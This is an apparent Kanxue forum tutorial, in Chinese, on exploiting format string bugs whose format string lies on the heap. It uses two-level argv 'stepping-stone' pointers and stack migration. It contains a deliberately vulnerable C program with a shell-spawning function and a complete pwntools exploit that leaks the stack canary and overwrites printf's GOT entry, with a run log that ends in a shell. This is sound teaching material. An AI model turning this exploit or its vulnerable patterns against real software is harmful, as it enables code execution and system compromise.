非栈与栈最大的区别，当然就是字符串存放的内存区域类型不同，尽管va_arg仍是从寄存器和栈上获取数据，在其余可变参数正常提供给类似与xxprintf函数时，格式化字符串是在栈还是非栈上当前没有任何影响。  
  
  
但是这一区别会影响格式化字符串漏洞的利用吗？  
  
  
对于非任意地址读写是没有影响的，因为本来也就是读取栈上的数据，对于任意地址读写影响可以大了，因为设置的任意地址是跟随格式化字符串一起存在，存放在栈上时还可以检索到，存放到非栈上时应该怎么检索呢？  
  
  
处理这个问题的关键在于，如何让自定义的地址被检索到，进而发挥它跳板的作用，泄露或篡改地址上的数据，我们可以从地址设置方式和地址检索方式两方面下手。  
  
  
◆借助跳板先造地址再读写操作。  
  
  
首先明确一点制造地址也是需要通过%n进行修改的，在前面已经知道了%n需要的是一个二连地址（地址1保存的地址2，然后修改地址2上的数据），因此直接将栈上保存的数据修改为一个可用地址肯定是不行。  
  
  
```
| stack address1 | address2 |

%n, (stack address) -> *(address2) = xxx

```  
  
  
  
此时我们知道，address2上的数据可以被%n修改，但address2则不行，但是如果address2本身就是栈区中的地址呢？  
  
  
如果是这样的话，这意味着address2是一个合适的跳板，它可以间接的帮助我们实现栈上数据的修改。  
  
  
```
target：address3

| stack | address1 : address2 |
        | address2 : "aaa"    |
staget 1（change stack address2 save value to address3）：
    %n, (stack address1) -> *(stack address2) = address3
staget 2（change target address3 to xxx）：
    %n, (stack address2) -> *(address3) = xxxx

```  
  
  
  
当栈上数据被设置成目标地址后，我们就可以再次通过%s或%n实现任意地址的读写。  
  
而且跳板地址在栈中并不会少见，比如main函数必备的命令行参数argv就具备这种特性。  
  
  
进一步假设，如果address2中存储的是一个栈地址address4，那么通过%n, (stack address2) [1]可以起到修改"aaa"的作用。  
  
  
```
target：address3

| stack | address1 : address2 |
        | address2 : address4 |
        | address4 : "aaaa"   |

```  
  
  
  
上方所有的做法，最终目的都是为了实现读写某个栈地址上保存的数据，由于%n的限制，使得我们必须借助踏板地址（如果栈地址A保存的数据仍为栈地址，那么A就是踏板），由于踏板地址仍为栈地址的特性，使得我们可以通过%n实现读写栈地址上保存数据的目的。  
  
  
当我们拥有一级踏板时（stack_addr1->stack_addr2），我们需要先修改stack_addr2中保存的数值为目标地址，再通过%n, (stack_addr2)读写目标地址上保存的数据。  
  
  
当我们拥有二级踏板时（stack_addr1->stack_addr2->stack_addr3），我们可以直接通过%n, (stack_addr2)读写stack_addr3上保存的数据。  
  
  
◆狸猫换太子，借助栈迁移将栈迁移到格式化字符串存储的区域上，完成迁移后，va_arg可以获取非栈上的数据。  
  
  
```
non stack save -> format string

va_arg	-> use register && stack
        -> cannot get non stack info

stack -> migrate to non stack zone -> va_arg can get non stack info

va_arg
    -> rbp + 0x10
    -> new rbp address value in non stack zone

```  
  
  
  
```
```  
##   
  
  
下面给出了示例程序的源代码。  
  
  
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>

#define MAX_ADDR_LEN					16
#define MAX_BUF_LEN						64
#define macro_va_args4int(int, ...)		va_args4int(int, __VA_ARGS__)

typedef struct _print_str {
    char* desc;
    char* str;
    char* str_bytes;
} print_str;

static char* fmt_str = "";

static void va_args4int(int num, ...)
{
    va_list valist;
    unsigned long long tmp;

    va_start(valist, num);

    while (num > 0) {
        tmp = va_arg(valist, unsigned long long);
        printf("get %d - %llx\n", num, tmp);

        num--;
    }

    va_end(valist);
}

static void addr_with_null_analyze(void)
{
    int cnt;
    print_str addr_null_prt[] = {
        {
            .desc = "0x00 before the effective address\0",
            .str = "0x0000444444404545\0",
            .str_bytes = "\x45\x45\x40\x44\x44\x44\x00\x00\0",
        },
        {
            .desc = "0x00 at the end of effective address\0",
            .str = "0x4444444444404500\0",
            .str_bytes = "\x00\x45\x40\x44\x44\x44\x44\x44\0",
        },
        {
            .desc = "0x00 in the effective address\0",
            .str = "0x4444444444400045\0",
            .str_bytes = "\x45\x00\x40\x44\x44\x44\x44\x44\0",
        },
    };

    cnt = sizeof(addr_null_prt) / sizeof(print_str);
    while (cnt > 0) {
        printf(
            "desc: %s\n"
            "\torig: %s\n"
            "\tbytes: start-%s-end\n",
            addr_null_prt[cnt - 1].desc,
            addr_null_prt[cnt - 1].str,
            addr_null_prt[cnt - 1].str_bytes
        );

        cnt--;
    }
}

static void bytes_print(const char* data)
{
    int i = 0;
    char buf[MAX_BUF_LEN];

    snprintf(buf, MAX_BUF_LEN, "%s %s", __func__, data);

    printf("0x");
    while (i < MAX_BUF_LEN) {
        printf("%hhx", buf[i]);

        i++;
    }
    printf("\n");
}

static void stack_mem_read(void)
{
    printf(
        "|0x%llx|0x%llx|0x%llx|0x%llx|0x%llx"
        "|0x%llx|0x%llx|0x%llx|0x%llx|0x%llx|\n"
    );
}

static void arbitrary_mem_read_wrtie(const char* fmt_str)
{
    char buf[MAX_BUF_LEN];

    snprintf(buf, MAX_BUF_LEN, "welcome, %s!\n", fmt_str);

    printf(buf);
}

static void fmt_str_vuln_test(const char* desc)
{
    char buf[MAX_BUF_LEN];

    printf("%s\n", desc);

    read(STDIN_FILENO, buf, MAX_BUF_LEN);
    arbitrary_mem_read_wrtie(buf);
}

static void fmt_str_in_heap_test(void)
{
    char* buf;

    buf = malloc(sizeof(char) * MAX_BUF_LEN);
    if (!buf) {
        printf("malloc failed\n");
    }

    read(STDIN_FILENO, buf, MAX_BUF_LEN);
    printf(buf);
}

static void gift_get(void)
{
    system("/bin/sh");
}

int main(int argc, char* argv[])
{
    macro_va_args4int(4, 3, 10, 99, 57);

    if (argc == 2) {
        bytes_print(argv[1]);
    }
    addr_with_null_analyze();
    stack_mem_read();

    fmt_str_vuln_test("format string vuln test for read");
    printf("&argv 0x%llx\n"
        "argv 0x%llx\n"
        "argv0 0x%llx\n",
        (unsigned long long)(&argv),
        (unsigned long long)(argv),
        *(unsigned long long*)(argv));
    fmt_str_in_heap_test();
    fmt_str_in_heap_test();
    fmt_str_in_heap_test();
    fmt_str_in_heap_test();
    fmt_str_in_heap_test();
    fmt_str_in_heap_test();
    fmt_str_vuln_test("format string vuln test for write");

    printf("leave %s\n", __func__);
}

```  
  
  
  
从源代码中可以看到，程序具备非常明显的格式化漏洞，下方给出的exploit，针对栈上格式化字符串漏洞的读写和非栈上格式化字符串漏洞的读写进行了构造。  
  
  
其中非栈上格式化字符串漏洞的读写采用了二级踏板地址，先造地址后读取。  
  
  
```
import sys
import time
import pwn

sys.path.append('../MyTools')
import conversion

pwn.context.clear()
pwn.context.update(
    arch = 'amd64', os = 'linux',
)

target_info = {
    'exec_path': './fmtstr_example',
    'exec_info': None,
    'addr_len': 0x8,
    'got_name': 'printf',
    'caller_args_save_cnt': 0x5,
    'stack_len': 0x60,
    'heap_func_stack_len': 0x10,
    'align_fix': 0x0,
    'fixed_output_1': b'welcome, ',
    'fixed_output_2': b'format string vuln test for write\n',
}

'''| callee stack | caller rbp | caller return  | caller stack                              || ..., canary  | rbp        | return address | argc, argv, [format string][address], ... |                                                                |             ^                                                                |-------------|[format string] read / write [address]'''

def align_fix_len_get(data_str):
    target_info['align_fix'] = int(len(data_str) / target_info['addr_len']) * target_info['addr_len']
    if ((len(data_str) % target_info['addr_len']) != 0):
        target_info['align_fix'] += target_info['addr_len']
    align_fix_len = int(target_info['align_fix'] / target_info['addr_len'])
    return align_fix_len

def fmt_str_read_payload_get(got_addr_index):
    example_fmt_str_read = b'|0x%10$lx|0x%10$s'
    got_addr_index += align_fix_len_get(example_fmt_str_read)

    # leak canary
    fmt_str = b'|0x%' + str(canary_index).encode() + b'$lx'

    # read got
    fmt_str += b'|0x%' + str(got_addr_index).encode() + b'$s'

    target_info['align_fix'] = target_info['align_fix'] - len(fmt_str)
    fmt_str += b'A' * target_info['align_fix']

    # target address set
    fmt_str += pwn.p64(addr4got)
    return fmt_str

def fmt_str_write_payload_get(got_addr_index):
    example_fmt_str_wrtie = b'%.1000x%10$n%.10x%10$hn'
    got_addr_index += align_fix_len_get(example_fmt_str_wrtie)

    gitf_addr = target_info['exec_info'].symbols['gift_get']
    print('[**] gift address = {0}'.format(hex(gitf_addr)))

    new_val_4bytes_high = (gitf_addr & 0xffff0000) >> 16
    new_val_2bytes_low = gitf_addr & 0xffff
    cnvrt_size2len_high = new_val_4bytes_high - len(target_info['fixed_output_1'])
    cnvrt_size2len_low = new_val_2bytes_low - cnvrt_size2len_high- len(target_info['fixed_output_1'])
    print('[**] want to change got address to {0}_{1}'.format(hex(new_val_4bytes_high), hex(new_val_2bytes_low)))
    addr4low_bytes_write = addr4got
    addr4high_bytes_write = addr4low_bytes_write + 0x2

    # write got
    fmt_str = b'%.' + str(cnvrt_size2len_high).encode() + b'x'
    fmt_str += b'%' + str(got_addr_index).encode() + b'$n'
    fmt_str += b'%.' + str(cnvrt_size2len_low).encode() + b'x'
    fmt_str += b'%' + str(got_addr_index + 1).encode() + b'$hn'

    target_info['align_fix'] = target_info['align_fix'] - len(fmt_str)
    fmt_str += b'A' * target_info['align_fix']

    # target address set
    fmt_str += pwn.p64(addr4high_bytes_write)
    fmt_str += pwn.p64(addr4low_bytes_write)
    return fmt_str

def fmt_str4heap_payload_2pendal_get():
    # argv in stack address is 1nd pendal
    stack_argv_index = target_info['caller_args_save_cnt'] + int(target_info['heap_func_stack_len'] / target_info['addr_len'])
    stack_argv_index += 2 # rbp && callee return
    stack_argv_index += 1

    pendal_1nd_addr = conn.recvline()
    pendal_1nd_addr = conversion.str2int(pendal_1nd_addr[8:-1])
    pendal_2nd_addr = conn.recvline()
    pendal_2nd_addr = conversion.str2int(pendal_2nd_addr[7:-1])
    pendal_2nd_save_addr = conn.recvline()
    pendal_2nd_save_addr = conversion.str2int(pendal_2nd_save_addr[8:-1])
    print('[++] receive &argv = {0}, argv = {1}, argv[0] = {2}'.format(hex(pendal_1nd_addr), hex(pendal_2nd_addr), hex(pendal_2nd_save_addr)))

    offset = pendal_2nd_addr - pendal_1nd_addr
    offset = int(offset / target_info['addr_len'])
    argv_index = stack_argv_index + offset

    high_4bytes_val = (addr4got & 0xffff0000) >> 16
    low_2bytes_val = addr4got & 0xffff
    print('[**] low = {0}, high = {1}'.format(hex(low_2bytes_val), hex(high_4bytes_val)))

    # bytes 0 - 1
    fmt_str4low = b'%.' + str(low_2bytes_val).encode() + b'x'
    fmt_str4low += b'%' + str(argv_index).encode() + b'$hn'

    argv_0_addr_low_2bytes = pendal_2nd_save_addr & 0xff
    argv_0_addr_low_2bytes += 0x2
    fmt_str4update_addr4middle = b'%.' + str(argv_0_addr_low_2bytes).encode() + b'x'
    fmt_str4update_addr4middle += b'%' + str(stack_argv_index).encode() + b'$hhn'

    # bytes 2 - 6
    fmt_str4middle = b'%.' + str(high_4bytes_val).encode() + b'x'
    fmt_str4middle += b'%' + str(argv_index).encode() + b'$n'

    argv_0_addr_low_2bytes += 0x4
    fmt_str4update_addr4high = b'%.' + str(argv_0_addr_low_2bytes).encode() + b'x'
    fmt_str4update_addr4high += b'%' + str(stack_argv_index).encode() + b'$hhn'

    # bytes 7 - 8
    fmt_str4high = b'%' + str(argv_index).encode() + b'$hn'

    # read got
    offset = pendal_2nd_save_addr - pendal_1nd_addr
    offset = int(offset / target_info['addr_len'])
    argv_index = stack_argv_index + offset
    fmt_str4read_got = b'%' + str(argv_index).encode() + b'$s'

    return fmt_str4low, fmt_str4update_addr4middle, fmt_str4middle, fmt_str4update_addr4high, fmt_str4high, fmt_str4read_got

target_info['exec_info'] = pwn.ELF(target_info['exec_path'])

canary_index = target_info['caller_args_save_cnt'] + int(target_info['stack_len'] / target_info['addr_len'])
print('[**] canary index = {0}'.format(canary_index))
addr4got = target_info['exec_info'].got[target_info['got_name']]
print('[**] {0}@got address = {1}'.format(target_info['got_name'], hex(addr4got)))

got_addr_index = canary_index + 4 # rbp && callee return && argc && argv
got_addr_index += 1

conn = pwn.process(
    argv = [
        target_info['exec_path'],
        b'\x44\x40\x45\x45',
    ],
)

fmt_str4read_got = fmt_str_read_payload_get(got_addr_index)
conn.send(fmt_str4read_got)
conn.recvuntil(target_info['fixed_output_1'])
leak_info = conn.recvuntil(b'!\n')
leak_info4canary_val = conversion.str2int(leak_info[3:3 + 16]) # skip [|0x]
leak_info4got_save_addr = conversion.bytes2int(leak_info[19 + 3:19 + 3 + 6]) # skip canary info && [|0x]
print('[++] receive canary value = {0}'.format(hex(leak_info4canary_val)))
print('[++] receive {0}@libc address = {1}'.format(target_info['got_name'], hex(leak_info4got_save_addr)))

fmt_str4heap_low, fmt_str4update_addr4middle, fmt_str4heap_middle, fmt_str4update_addr4high, fmt_str4high, fmt_str4read_got = fmt_str4heap_payload_2pendal_get()
conn.send(fmt_str4heap_low)
time.sleep(1)
conn.send(fmt_str4update_addr4middle)
time.sleep(1)
conn.send(fmt_str4heap_middle)
time.sleep(1)
conn.send(fmt_str4update_addr4high)
time.sleep(1)
conn.send(fmt_str4high)
time.sleep(1)
conn.send(fmt_str4read_got)

fmt_str4wtite_got = fmt_str_write_payload_get(got_addr_index)
conn.send(fmt_str4wtite_got)
leak_data = conn.recvuntil(b'!\n')
end_site = leak_data.find(target_info['fixed_output_2'])
got_save_addr = conversion.bytes2int(leak_data[end_site - 6:end_site])
print('[++] receive {0}@libc address = {1} by heap'.format(target_info['got_name'], hex(got_save_addr)))
conn.interactive()

```  
  
  
  
运行exploit后，我们可以成功获取Shell！  
  
  
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[**] canary index = 17
[**] printf@got address = 0x404020
[+] Starting local process './fmtstr_example': pid 107614
[**] strings: b'808cd4c2bd46d700'
[**] hex: 0x808cd4c2bd46d700
[**] bytes: b'\xb0\xc5\xe1\xf7\xff\x7f'
[**] hex: 0x7ffff7e1c5b0
[++] receive canary value = 0x808cd4c2bd46d700
[++] receive printf@libc address = 0x7ffff7e1c5b0
[**] strings: b'7fffffffdf70'
[**] hex: 0x7fffffffdf70
[**] strings: b'7fffffffe098'
[**] hex: 0x7fffffffe098
[**] strings: b'7fffffffe320'
[**] hex: 0x7fffffffe320
[++] receive &argv = 0x7fffffffdf70, argv = 0x7fffffffe098, argv[0] = 0x7fffffffe320
[**] low = 0x4020, high = 0x40
[**] gift address = 0x40158a
[**] want to change got address to 0x40_0x158a
[**] bytes: b'\xb0\xc5\xe1\xf7\xff\x7f'
[**] hex: 0x7ffff7e1c5b0
[++] receive printf@libc address = 0x7ffff7e1c5b0 by heap
[*] Switching to interactive mode
$ id
uid=1000(astaroth) gid=1000(astaroth) groups=1000(astaroth),...
$

```  
```
```  
```
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HdGonls53t1vVzOPbheS5f4iciaXCGibNZ7EpK34p2Hq6mMFyQ35QpI3MtACDNL5CGxy78IEL0Sk3Xw/640?wx_fmt=png&from=appmsg "")  
  
  
看雪ID：福建炒饭乡会  
  
https://bbs.kanxue.com/user-home-1000123.htm  
  
*本文为看雪论坛精华文章，由 福建炒饭乡会 原创，转载请注明来自看雪社区  
  
  
  
# 往期推荐  
  
1、[PWN入门-SROP拜师](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458579476&idx=2&sn=4f9adc1e7d61c7357bdc85ba654f24cb&chksm=b18dc29e86fa4b88c483a581131de043b076918cd7c7436a82e9bb56bc37c8f1edf6c87d8350&scene=21#wechat_redirect)  
  
  
2、[一种apc注入型的Gamarue病毒的变种](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458579387&idx=1&sn=9d6fbf25f11b3d99c92c5ac8de0587d5&chksm=b18dc13186fa4827ae7a7bf909e0d2b9490c6df4417c1d7eebc27127133daa9771c212b4f310&scene=21#wechat_redirect)  
  
  
3、[野蛮fuzz：提升性能](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458579145&idx=1&sn=9134327916f678cfe7e2bc3371cedeaf&chksm=b18dc04386fa49557abc8c7e6ce3410dd4042ed88635c48961fda72b7fa4425698e56bb86ff6&scene=21#wechat_redirect)  
  
  
4、[关于安卓注入几种方式的讨论，开源注入模块实现](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458579138&idx=1&sn=fef09513ae9f594e68a503f69a312f4f&chksm=b18dc04886fa495e440990cd2dbddb24693452562e53bd8cb565063ddee921b7e288477f4eea&scene=21#wechat_redirect)  
  
  
5、[2024年KCTF水泊梁山-反混淆](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458579017&idx=2&sn=a97dacde8a6c913108999da8a96a667f&chksm=b18dc0c386fa49d57ce9f0ce6923690d6eb8efb3ccb8032e8c6b923184af3dd29b1b4471f9a2&scene=21#wechat_redirect)  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Evr07bQdfia9LpR5iaEy5kq9JqQviaMDHAfchRqVz37uWYaFh1HpKqbbKLicBLFaG0PrNJQ2jF1M5iawg/640?wx_fmt=gif&from=appmsg "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Evr07bQdfia9LpR5iaEy5kq9JqQviaMDHAfchRqVz37uWYaFh1HpKqbbKLicBLFaG0PrNJQ2jF1M5iawg/640?wx_fmt=gif&from=appmsg "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Evr07bQdfia9LpR5iaEy5kq9JqQviaMDHAfchRqVz37uWYaFh1HpKqbbKLicBLFaG0PrNJQ2jF1M5iawg/640?wx_fmt=gif&from=appmsg "")  
  
**球在看**  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Evr07bQdfia9LpR5iaEy5kq9x9J7HsFFCOmJgr3M8iahr6cOlJs0W3LEt3WjfL78ELDAFCic1nDwOCIA/640?wx_fmt=gif&from=appmsg "")  
  
点击阅读原文查看更多  
  
